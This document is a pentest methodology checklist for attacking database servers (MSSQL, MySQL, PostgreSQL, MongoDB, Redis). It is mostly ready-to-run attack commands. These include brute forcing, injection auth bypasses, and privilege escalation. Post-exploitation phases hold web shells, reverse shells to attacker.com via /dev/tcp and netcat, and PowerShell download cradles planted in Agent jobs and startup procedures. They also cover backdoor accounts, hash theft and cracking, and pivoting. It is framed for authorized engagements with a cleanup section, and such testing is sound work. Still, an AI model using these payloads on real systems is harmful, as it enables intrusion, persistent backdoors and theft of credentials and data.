# Database Technical Testing Checklist

Systematic methodology for hands-on security testing of database systems. Work through phases sequentially, documenting all attempts in [[DB-03-Query-Tracker]].

Related: [[DB-01-Admin-Checklist]] | [[DB-04-Evidence-Collection]] | [[DB-05-Reporting-Template]]

---

## Testing Phases Overview

1. [[#Phase 1 Network Enumeration]] (15-30 min)
2. [[#Phase 2 Service Identification]] (15-30 min)
3. [[#Phase 3 Authentication Testing]] (30-60 min)
4. [[#Phase 4 Authorization Testing]] (45-90 min)
5. [[#Phase 5 Configuration Review]] (30-60 min)
6. [[#Phase 6 Privilege Escalation]] (45-90 min)
7. [[#Phase 7 Post-Exploitation]] (1-2 hours)
8. [[#Phase 8 Data Exfiltration]] (30-60 min)
9. [[#Phase 9 Persistence]] (30-45 min)
10. [[#Phase 10 Lateral Movement]] (45-90 min)

---

## Phase 1: Network Enumeration

**Objective**: Discover database services on the network

### Port Scanning

#### Quick Scan (Default Ports)
```bash
# Nmap - Common DB ports
nmap -p 1433,3306,5432,1521,27017,6379,5984,9042,9200,50000 target.com

# Nmap - Fast scan with service detection
nmap -sV -T4 -p 1433,3306,5432,1521,27017,6379 target.com
```

#### Full Port Scan
```bash
# All TCP ports
nmap -p- target.com

# UDP scan (SQL Server uses UDP 1434 for browser service)
nmap -sU -p 1434 target.com
```

#### Subnet Scanning
```bash
# Scan entire subnet for DB services
nmap -sV -p 1433,3306,5432,1521,27017 192.168.1.0/24

# Fast scan with Masscan
masscan -p1433,3306,5432 192.168.1.0/24 --rate=1000
```

**Log**: [[DB-03-Query-Tracker#Discovery]]

**Screenshot**: [[DB-04-Evidence-Collection#Network Scan]]

### Service Discovery

#### Metasploit Discovery
```bash
# MSSQL discovery
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS target.com
run

# MySQL discovery
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target.com
run

# PostgreSQL discovery
use auxiliary/scanner/postgres/postgres_version
set RHOSTS target.com
run
```

#### Manual Banner Grabbing
```bash
# Netcat
nc -nv target.com 1433
nc -nv target.com 3306

# Telnet
telnet target.com 1433

# OpenSSL (if TLS/SSL)
openssl s_client -connect target.com:1433
```

---

## Phase 2: Service Identification

**Objective**: Fingerprint database type and version

### Version Detection

#### Nmap NSE Scripts
```bash
# MSSQL
nmap -p 1433 --script ms-sql-info target.com
nmap -p 1433 --script ms-sql-config target.com

# MySQL
nmap -p 3306 --script mysql-info target.com
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=pass target.com

# PostgreSQL
nmap -p 5432 --script pgsql-brute target.com

# MongoDB
nmap -p 27017 --script mongodb-info target.com
nmap -p 27017 --script mongodb-databases target.com

# Redis
nmap -p 6379 --script redis-info target.com
```

#### Client Connection
```bash
# MSSQL (with credentials)
sqsh -S target.com -U sa -P password

# MySQL
mysql -h target.com -u root -p

# PostgreSQL
psql -h target.com -U postgres

# MongoDB
mongosh mongodb://target.com:27017

# Redis
redis-cli -h target.com
```

**Document**:
- [ ] Database type: ________________
- [ ] Version: ________________
- [ ] Edition: ________________
- [ ] OS: ________________
- [ ] Instance name: ________________

**Screenshot**: [[DB-04-Evidence-Collection#Version Detection]]

---

## Phase 3: Authentication Testing

**Objective**: Test authentication mechanisms and gain access

Reference: [[DB-06-Quick-Reference#Default Credentials]]

### Default Credentials Testing

#### Common Defaults (Try First)
```
MSSQL:  sa:<blank>, sa:sa, sa:password
MySQL:  root:<blank>, root:root, root:password
PostgreSQL: postgres:<blank>, postgres:postgres
Oracle: SYS:change_on_install, SYSTEM:manager, SCOTT:tiger
MongoDB: admin:<blank>, <no auth>
Redis: <no auth>
```

#### Manual Testing
```bash
# MSSQL
sqsh -S target.com -U sa -P ''
sqsh -S target.com -U sa -P 'sa'

# MySQL
mysql -h target.com -u root
mysql -h target.com -u root -p'root'

# PostgreSQL
psql -h target.com -U postgres -W

# MongoDB
mongosh mongodb://target.com:27017 --username admin --password ''

# Redis (no auth)
redis-cli -h target.com
127.0.0.1:6379> INFO
```

**Log each attempt**: [[DB-03-Query-Tracker#Auth Testing]]

### Brute Force Attack

#### Hydra
```bash
# MSSQL
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://target.com

# MySQL
hydra -l root -P passwords.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target.com

# MongoDB
hydra -l admin -P passwords.txt mongodb://target.com:27017
```

#### Medusa
```bash
# MSSQL
medusa -h target.com -u sa -P passwords.txt -M mssql

# MySQL
medusa -h target.com -u root -P passwords.txt -M mysql

# PostgreSQL
medusa -h target.com -u postgres -P passwords.txt -M postgres
```

#### Ncrack
```bash
ncrack -p 1433 --user sa -P passwords.txt target.com
```

#### Metasploit
```bash
# MSSQL brute force
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# MySQL brute force
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USERNAME root
set PASS_FILE passwords.txt
run
```

**Screenshot**: [[DB-04-Evidence-Collection#Successful Login]]

### Windows Authentication (MSSQL)

#### Pass-the-Hash
```bash
# Using Impacket mssqlclient.py
mssqlclient.py -windows-auth DOMAIN/user@target.com -hashes :NTHASH

# Using Metasploit
use auxiliary/admin/mssql/mssql_exec
set RHOSTS target.com
set USERNAME DOMAIN\user
set PASSWORD hash
run
```

#### Kerberos Authentication
```bash
# Request TGT
getTGT.py DOMAIN/user:password

# Use ticket with mssqlclient.py
export KRB5CCNAME=user.ccache
mssqlclient.py -k DOMAIN/user@sql-server.domain.local
```

### Authentication Bypass

#### SQL Injection (if via app)
```sql
-- Authentication bypass
admin' --
admin' OR '1'='1'--
admin') OR ('1'='1'--
```

#### NoSQL Injection (MongoDB)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

---

## Phase 4: Authorization Testing

**Objective**: Test permission boundaries and privilege levels

### User Enumeration

#### MSSQL
```sql
-- List all logins
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');

-- List database users
SELECT name, type_desc FROM sys.database_principals WHERE type IN ('S','U','G');

-- Check login roles
SELECT 
    sp.name AS LoginName,
    sp.type_desc,
    spr.name AS RoleName
FROM sys.server_principals sp
LEFT JOIN sys.server_role_members srm ON sp.principal_id = srm.member_principal_id
LEFT JOIN sys.server_principals spr ON srm.role_principal_id = spr.principal_id
WHERE sp.type IN ('S','U','G');
```

#### MySQL
```sql
-- List users
SELECT user, host, authentication_string FROM mysql.user;

-- Check privileges
SELECT * FROM mysql.user WHERE user='current_user';

-- Show grants
SHOW GRANTS FOR 'user'@'host';
```

#### PostgreSQL
```sql
-- List users
SELECT usename, usesuper, usecreatedb FROM pg_user;

-- Check roles
SELECT rolname FROM pg_roles;

-- Show grants
\du
SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='tablename';
```

**Log**: [[DB-03-Query-Tracker#User Enum]]

### Permission Testing

#### Test Database Access
```sql
-- MSSQL
SELECT name FROM sys.databases;
USE [database_name];

-- MySQL
SHOW DATABASES;
USE database_name;

-- PostgreSQL
\l
\c database_name
```

#### Test Table Access
```sql
-- Try reading from all tables
SELECT * FROM table_name;

-- Try writing
INSERT INTO table_name VALUES (...);

-- Try creating objects
CREATE TABLE test_table (id INT);
DROP TABLE test_table;
```

#### Test Stored Procedure Execution
```sql
-- MSSQL
EXEC sp_who;
EXEC sp_databases;
EXEC xp_cmdshell 'whoami';

-- MySQL
CALL procedure_name();

-- PostgreSQL
SELECT * FROM pg_proc;
```

**Log all attempts**: [[DB-03-Query-Tracker#Permission Tests]]

### Role Abuse

#### MSSQL Public Role
```sql
-- Check public role permissions
SELECT 
    pr.name AS RoleName,
    pe.permission_name,
    pe.state_desc
FROM sys.database_permissions pe
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_id
WHERE pr.name = 'public';
```

#### MySQL Wildcard Grants
```sql
-- Check for wildcards
SELECT user, host FROM mysql.user WHERE host='%';
SELECT user, host, db FROM mysql.db WHERE host='%' OR db='%';
```

---

## Phase 5: Configuration Review

**Objective**: Identify dangerous misconfigurations

Reference: [[DB-01-Admin-Checklist#Database Configuration]]

### MSSQL Configuration

#### Dangerous Features Enabled
```sql
-- Check xp_cmdshell
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Check OLE Automation
SELECT value FROM sys.configurations WHERE name = 'Ole Automation Procedures';

-- Check Ad Hoc Distributed Queries
SELECT value FROM sys.configurations WHERE name = 'Ad Hoc Distributed Queries';

-- Check CLR
SELECT value FROM sys.configurations WHERE name = 'clr enabled';

-- Show all configurations
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;
```

#### Linked Servers
```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers WHERE is_linked = 1;

-- Check linked server login mapping
EXEC sp_helplinkedsrvlogin;

-- Test linked server access
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version');
```

**Screenshot**: [[DB-04-Evidence-Collection#Config Review]]

### MySQL Configuration

#### Dangerous Settings
```sql
-- Check FILE privilege
SELECT user, host, File_priv FROM mysql.user;

-- Check secure_file_priv (empty = no restriction)
SHOW VARIABLES LIKE 'secure_file_priv';

-- Check local_infile
SHOW VARIABLES LIKE 'local_infile';

-- Check if logging
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'log_error';

-- Check plugins (UDF)
SELECT * FROM mysql.plugin;
SHOW PLUGINS;
```

### PostgreSQL Configuration

#### Dangerous Settings
```sql
-- Check superusers
SELECT usename FROM pg_user WHERE usesuper = true;

-- Check trusted procedural languages
SELECT lanname, lanpltrusted FROM pg_language;

-- Check pg_hba.conf (requires superuser)
SELECT * FROM pg_hba_file_rules;

-- Check SSL
SHOW ssl;

-- Check extensions
SELECT * FROM pg_extension;
```

### MongoDB Configuration

#### Security Checks
```javascript
// Check if authentication is enabled
db.runCommand({getCmdLineOpts: 1})

// Check roles
db.getRoles({showPrivileges: true})

// Check if JavaScript is enabled
db.adminCommand({getParameter: 1, javascriptEnabled: 1})

// Check bind IP
db.serverCmdLineOpts()
```

### Redis Configuration

#### Security Checks
```bash
# Check if authentication is required
redis-cli -h target.com
127.0.0.1:6379> INFO

# If successful without password, auth is disabled

# Check configuration
CONFIG GET *

# Check bind address
CONFIG GET bind

# Check protected mode
CONFIG GET protected-mode
```

**Log all findings**: [[DB-03-Query-Tracker#Config Findings]]

---

## Phase 6: Privilege Escalation

**Objective**: Escalate from low-privilege user to admin/root

Reference: [[DB-06-Quick-Reference#Privilege Escalation]]

### MSSQL Privilege Escalation

#### Impersonation
```sql
-- List impersonatable logins
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Revert
REVERT;

-- Impersonate via database user
USE [database];
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
```

#### Linked Server Escalation
```sql
-- If you have access to linked server with higher privs
EXECUTE('EXEC sp_addsrvrolemember ''DOMAIN\lowpriv'', ''sysadmin'';') AT [LinkedServer];

-- Or enable xp_cmdshell on remote server
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServer];
EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServer];
EXECUTE('EXEC xp_cmdshell ''whoami'';') AT [LinkedServer];
```

#### Service Account Token Impersonation
```sql
-- If SQL Server service runs as privileged account
-- Use xp_cmdshell to get SYSTEM/service account token
EXEC xp_cmdshell 'whoami';
-- Then use Metasploit incognito or similar to impersonate
```

**Screenshot**: [[DB-04-Evidence-Collection#Privilege Escalation]]

### MySQL Privilege Escalation

#### GRANT Privilege Abuse
```sql
-- If you have GRANT privilege
GRANT ALL PRIVILEGES ON *.* TO 'lowpriv'@'%';
FLUSH PRIVILEGES;

-- Add to admin
UPDATE mysql.user SET Super_priv='Y', File_priv='Y' WHERE User='lowpriv';
FLUSH PRIVILEGES;
```

#### UDF Privilege Escalation
```sql
-- Create UDF for command execution (requires FILE privilege)
-- Upload lib_mysqludf_sys.so to plugin directory
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute commands as mysql user
SELECT sys_exec('id > /tmp/out.txt');
```

### PostgreSQL Privilege Escalation

#### Superuser Escalation
```sql
-- If you have CREATEROLE
CREATE USER hacker WITH SUPERUSER PASSWORD 'Password123!';

-- Or alter existing user
ALTER USER lowpriv WITH SUPERUSER;
```

#### Untrusted Language Exploitation
```sql
-- If untrusted language is available
CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$
import os
return os.popen(cmd).read()
$$ LANGUAGE plpythonu;

-- Execute
SELECT exec('id');
```

**Log**: [[DB-03-Query-Tracker#Privilege Escalation]]

---

## Phase 7: Post-Exploitation

**Objective**: Execute OS commands and access file system

Reference: [[DB-06-Quick-Reference#OS Command Execution]]

### MSSQL Post-Exploitation

#### Enable xp_cmdshell
```sql
-- Enable
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
```

#### Read Files (OPENROWSET)
```sql
-- Enable Ad Hoc Distributed Queries
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

-- Read file
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Read through UNC (forces NTLM auth - capture hash)
EXEC xp_dirtree '\\attacker.com\share';
EXEC xp_fileexist '\\attacker.com\share\file.txt';
```

#### OLE Automation (Alternative to xp_cmdshell)
```sql
-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command
DECLARE @output INT;
DECLARE @result INT;
EXEC @result = sp_OACreate 'WScript.Shell', @output OUT;
EXEC @result = sp_OAMethod @output, 'Run', NULL, 'cmd.exe /c whoami > C:\output.txt';
```

**Screenshot**: [[DB-04-Evidence-Collection#Command Execution]]

### MySQL Post-Exploitation

#### Read Files
```sql
-- Check FILE privilege
SELECT File_priv FROM mysql.user WHERE user='current';

-- Read file
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read via LOAD DATA LOCAL INFILE
CREATE TABLE temp_table (content TEXT);
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_table;
SELECT * FROM temp_table;
```

#### Write Files
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Write web shell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH key
SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';

-- Write cron job
SELECT '* * * * * root bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' INTO OUTFILE '/etc/cron.d/backdoor';
```

#### UDF Command Execution
```sql
-- Create UDF (requires lib uploaded to plugin dir)
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute
SELECT sys_exec('id');
SELECT sys_exec('nc attacker.com 4444 -e /bin/bash');
```

### PostgreSQL Post-Exploitation

#### Command Execution (COPY)
```sql
-- PostgreSQL 9.3+
CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Reverse shell
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
```

#### Read Files
```sql
-- pg_read_file (requires superuser)
SELECT pg_read_file('/etc/passwd', 0, 200);

-- Via COPY
CREATE TABLE file_read(data text);
COPY file_read FROM '/etc/passwd';
SELECT * FROM file_read;

-- Large objects
SELECT lo_import('/etc/passwd', 12345);
\lo_list
SELECT encode(data, 'escape') FROM pg_largeobject WHERE loid=12345;
```

#### Write Files
```sql
-- COPY TO
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';

-- Via large objects
SELECT lo_from_bytea(12346, 'web shell content');
SELECT lo_export(12346, '/var/www/html/shell.php');
```

**Log**: [[DB-03-Query-Tracker#Post-Exploitation]]

---

## Phase 8: Data Exfiltration

**Objective**: Extract sensitive data from database

### Identify Sensitive Data

#### Search for PII/Credentials
```sql
-- MSSQL
SELECT TABLE_NAME, COLUMN_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE COLUMN_NAME LIKE '%password%' 
   OR COLUMN_NAME LIKE '%ssn%'
   OR COLUMN_NAME LIKE '%credit%'
   OR COLUMN_NAME LIKE '%card%';

-- MySQL
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE COLUMN_NAME LIKE '%password%' 
   OR COLUMN_NAME LIKE '%ssn%';

-- PostgreSQL
SELECT table_name, column_name 
FROM information_schema.columns 
WHERE column_name LIKE '%password%' 
   OR column_name LIKE '%ssn%';
```

### Extract Credentials

#### MSSQL Hash Extraction
```sql
-- SQL Server logins (hashed passwords)
SELECT name, password_hash FROM sys.sql_logins;

-- Crack with hashcat
-- hashcat -m 1731 mssql_hashes.txt rockyou.txt
```

#### MySQL Hash Extraction
```sql
-- MySQL user table
SELECT user, host, authentication_string FROM mysql.user;

-- Old password hashes
SELECT user, host, password FROM mysql.user;  -- MySQL < 5.7

-- Crack with hashcat
-- hashcat -m 300 mysql_hashes.txt rockyou.txt
```

#### PostgreSQL Hash Extraction
```sql
-- PostgreSQL user hashes
SELECT usename, passwd FROM pg_shadow;

-- Crack with hashcat
-- hashcat -m 12 postgres_hashes.txt rockyou.txt
```

### Export Data

#### MSSQL Export
```sql
-- Export to CSV (requires xp_cmdshell)
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout "C:\temp\users.csv" -c -T';

-- Via SSIS or bulk insert
```

#### MySQL Export
```sql
-- Export to CSV
SELECT * FROM users 
INTO OUTFILE '/tmp/users.csv' 
FIELDS TERMINATED BY ',' 
ENCLOSED BY '"' 
LINES TERMINATED BY '\n';
```

#### PostgreSQL Export
```sql
-- Export to CSV
COPY users TO '/tmp/users.csv' WITH CSV HEADER;

-- Or via psql
\copy users TO '/tmp/users.csv' WITH CSV HEADER;
```

### Automated Extraction

#### Impacket mssqlclient.py
```bash
# Dump entire database
mssqlclient.py user:pass@target.com -db database -query "SELECT * FROM users"

# Or interactive
mssqlclient.py user:pass@target.com
SQL> SELECT * FROM users;
```

#### SQLMap
```bash
# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Dump entire database
sqlmap -u "http://target.com/page?id=1" --dump-all
```

**Screenshot**: [[DB-04-Evidence-Collection#Data Exfiltration]]

**Log**: [[DB-03-Query-Tracker#Data Extraction]]

---

## Phase 9: Persistence

**Objective**: Maintain access to database

### MSSQL Persistence

#### Create Backdoor Account
```sql
-- Create login
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
ALTER SERVER ROLE sysadmin ADD MEMBER backdoor;

-- Or use existing disabled account
ALTER LOGIN old_account ENABLE;
ALTER LOGIN old_account WITH PASSWORD = 'NewPassword123!';
ALTER SERVER ROLE sysadmin ADD MEMBER old_account;
```

#### SQL Server Agent Jobs
```sql
-- Create job for recurring command execution
USE msdb;
EXEC dbo.sp_add_job 
    @job_name = N'SystemMaintenance',
    @enabled = 1;

EXEC sp_add_jobstep 
    @job_name = N'SystemMaintenance',
    @step_name = N'Execute',
    @subsystem = N'CMDEXEC',
    @command = N'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/beacon.ps1")';

EXEC sp_add_jobschedule 
    @job_name = N'SystemMaintenance',
    @name = N'Daily',
    @freq_type = 4,  -- Daily
    @active_start_time = 030000;  -- 3 AM

EXEC sp_add_jobserver 
    @job_name = N'SystemMaintenance';
```

#### Startup Procedure
```sql
-- Create procedure that runs at SQL Server startup
CREATE PROCEDURE sp_backdoor
AS
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/beacon.ps1")';

-- Mark as startup procedure
EXEC sp_procoption @ProcName = 'sp_backdoor', @OptionName = 'startup', @OptionValue = 'on';
```

### MySQL Persistence

#### Create Backdoor Account
```sql
-- Create user with all privileges
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Password123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

#### Trigger-Based Persistence
```sql
-- Create trigger that executes on specific event
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON logs
FOR EACH ROW
BEGIN
  -- Execute command via UDF
  SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"');
END;
```

### PostgreSQL Persistence

#### Create Backdoor Account
```sql
CREATE USER backdoor WITH SUPERUSER PASSWORD 'Password123!';
```

#### Event Trigger
```sql
-- Create function that executes on DDL events
CREATE OR REPLACE FUNCTION backdoor_func() RETURNS event_trigger AS $$
BEGIN
  PERFORM pg_read_file('/tmp/execute_me', 0, 1000);
END;
$$ LANGUAGE plpgsql;

-- Create event trigger
CREATE EVENT TRIGGER backdoor ON ddl_command_start
EXECUTE FUNCTION backdoor_func();
```

**Log**: [[DB-03-Query-Tracker#Persistence]]

---

## Phase 10: Lateral Movement

**Objective**: Use database access to move to other systems

### MSSQL Lateral Movement

#### Linked Server Hopping
```sql
-- List linked servers
EXEC sp_linkedservers;

-- Query linked server
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version');

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer];

-- Chain through multiple servers
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [Server2]') AT [Server1];

-- Map all linked servers recursively
-- Use PowerUpSQL: Get-SQLServerLinkCrawl
```

#### SMB Relay via xp_dirtree
```bash
# Start Responder to capture hashes
sudo responder -I eth0

# From SQL Server, trigger SMB connection
EXEC xp_dirtree '\\attacker.com\share';

# Captured Net-NTLM hash can be:
# 1. Cracked with hashcat
# 2. Relayed with ntlmrelayx.py
```

#### Kerberos Attacks
```bash
# If SQL Server service account is domain admin
# Request TGS for SQL Server SPN
python GetUserSPNs.py DOMAIN/user:pass -request

# Crack TGS ticket
hashcat -m 13100 tgs.txt rockyou.txt

# Use cracked password with psexec
psexec.py DOMAIN/sqlservice:password@target.com
```

### Network Pivoting

#### Port Forwarding via Metasploit
```bash
# If you have meterpreter session from SQL injection
portfwd add -l 3389 -p 3389 -r internal-server
# Now RDP to localhost:3389

# Or use autoroute
run autoroute -s 192.168.1.0/24
# Use Metasploit modules against internal network
```

#### SOCKS Proxy via Chisel
```bash
# On attacker machine
./chisel server -p 8080 --reverse

# On SQL Server (via xp_cmdshell)
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/chisel.exe")';
EXEC xp_cmdshell 'chisel.exe client attacker.com:8080 R:1080:socks';

# Configure proxychains to use localhost:1080
# Now access internal network
proxychains nmap -sT -Pn 192.168.1.0/24
```

**Log**: [[DB-03-Query-Tracker#Lateral Movement]]

**Screenshot**: [[DB-04-Evidence-Collection#Lateral Movement]]

---

## Testing Completion Checklist

### Documentation Complete
- [ ] All phases attempted and documented
- [ ] [[DB-03-Query-Tracker]] fully populated
- [ ] [[DB-04-Evidence-Collection]] has all screenshots
- [ ] High/Critical findings have PoC documented
- [ ] Business impact assessed for each finding
- [ ] All SQL queries saved

### Evidence Collected
- [ ] Screenshots organized and named
- [ ] SQL queries exported (with results)
- [ ] PoC scripts saved
- [ ] Tool output saved (Nmap, Metasploit, etc.)
- [ ] Configuration files exported
- [ ] Hash files saved (for cracking)

### Findings Ready for Report
- [ ] Findings prioritized (Critical/High/Medium/Low)
- [ ] Each finding has clear PoC
- [ ] Remediation recommendations drafted
- [ ] Risk ratings justified

### Client Communication
- [ ] Critical findings reported immediately (if found)
- [ ] Testing completion confirmed with client
- [ ] Credentials/access returned or destroyed
- [ ] Final debrief scheduled

---

## Post-Testing

### Cleanup
- [ ] Remove any backdoor accounts created
- [ ] Delete any test tables/stored procedures
- [ ] Remove SQL Server Agent jobs (if created)
- [ ] Remove triggers (if created)
- [ ] Restore any modified configurations
- [ ] Verify no persistent access remains

### Reporting
Proceed to [[DB-05-Reporting-Template]] to document findings.

---

## Tags
#technical-testing #methodology #database-testing #hands-on #checklist

---

## Related Documents
- [[DB-00-Overview|Overview]]
- [[DB-01-Admin-Checklist|Admin Checklist]]
- [[DB-03-Query-Tracker|Query Tracker]]
- [[DB-04-Evidence-Collection|Evidence Collection]]
- [[DB-05-Reporting-Template|Reporting Template]]
- [[DB-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
